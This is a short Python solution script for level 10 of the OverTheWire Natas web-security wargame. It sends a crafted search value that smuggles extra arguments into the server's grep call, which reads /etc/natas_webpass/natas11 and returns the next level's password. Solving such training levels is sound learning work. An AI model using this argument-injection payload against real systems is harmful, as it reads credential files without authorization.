import requests
from requests.auth import HTTPBasicAuth
import natas9solution

auth = HTTPBasicAuth('natas10', natas9solution.get_pass())
def get_pass():
    param = {'needle':'c /etc/natas_webpass/natas11','submit':'Search'}
    r = requests.get('http://natas10.natas.labs.overthewire.org/', auth=auth, params=param)
    webcontent = r.text
   # print(webcontent)
    i = webcontent.find('natas11:')+8
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
